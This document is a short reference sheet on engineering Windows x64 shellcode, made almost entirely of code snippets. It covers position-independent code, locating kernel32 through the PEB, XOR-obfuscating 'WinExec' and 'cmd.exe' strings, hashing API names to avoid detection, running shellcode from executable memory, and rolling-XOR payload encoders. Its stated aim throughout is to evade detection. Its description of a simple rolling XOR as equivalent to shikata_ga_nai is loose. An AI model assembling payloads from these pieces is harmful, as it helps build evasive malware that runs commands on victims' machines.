# Shellcode Engineering

## Position-Independent Code (PIC)

Shellcode must work at any address — no absolute references.

```asm
; x64 PIC prologue: get current instruction pointer
call get_rip
get_rip:
    pop rbx          ; rbx = address of "get_rip" label
    sub rbx, 5       ; rbx = shellcode base

; Access data relative to rbx
lea rax, [rbx + data_offset]
```

## Windows x64 Shellcode Template

```asm
[BITS 64]

; Find kernel32.dll base via PEB
; PEB at gs:[0x60]
; PEB.Ldr at offset 0x18
; InMemoryOrderModuleList at offset 0x20
; Walk list: entry 1 = ntdll, entry 2 = kernel32

find_kernel32:
    xor rcx, rcx
    mov rax, [gs:rcx+0x60]    ; PEB
    mov rax, [rax+0x18]        ; PEB.Ldr
    mov rsi, [rax+0x20]        ; InMemoryOrderModuleList.Flink
    lodsq                       ; ntdll entry
    xchg rax, rsi
    lodsq                       ; kernel32 entry
    mov rbx, [rax+0x20]        ; DllBase = kernel32 base
```

## String Obfuscation

```c
// XOR encode strings at compile time, decode at runtime
// Avoids plaintext "WinExec", "cmd.exe" in shellcode

#define XOR_KEY 0x41

// Encode "WinExec" -> store encoded bytes
// Decode in shellcode: XOR each byte with key before use
unsigned char enc_winexec[] = { 'W'^0x41, 'i'^0x41, 'n'^0x41, 'E'^0x41, 'x'^0x41, 'e'^0x41, 'c'^0x41, 0 };
```

## Common Shellcode Patterns

```c
// LoadLibrary + GetProcAddress approach (simpler, more detectable)
HMODULE k32 = LoadLibraryA("kernel32.dll");
FARPROC wp = GetProcAddress(k32, "WinExec");
((void(*)(char*, int))wp)("cmd.exe", 1);

// Custom GetProcAddress by hash (avoids string "GetProcAddress")
DWORD HashStr(const char* s) {
    DWORD h = 0;
    while (*s) h = (h >> 13 | h << 19) + *s++;
    return h;
}
```

## Staged vs Stageless

| Type | Size | Pros | Cons |
|------|------|------|------|
| Stageless | Large (~200KB) | Self-contained | Easier to detect fully |
| Staged | Small (~300B) | Stage 1 downloads full payload | Requires network, stage 1 detectable |

## Testing Shellcode

```c
// Local test harness
#include <windows.h>

unsigned char shellcode[] = { ... };

int main() {
    void* mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(mem, shellcode, sizeof(shellcode));
    ((void(*)())mem)();
    return 0;
}
```

## Encoding Schemes

```python
# XOR encode
key = 0x41
encoded = bytes(b ^ key for b in shellcode)

# shikata_ga_nai equivalent (rolling XOR)
key = 0x12345678
encoded = bytearray()
for i in range(0, len(shellcode), 4):
    chunk = int.from_bytes(shellcode[i:i+4], 'little')
    encoded += (chunk ^ key).to_bytes(4, 'little')
    key ^= chunk  # update key with plaintext (polymorphic)
```
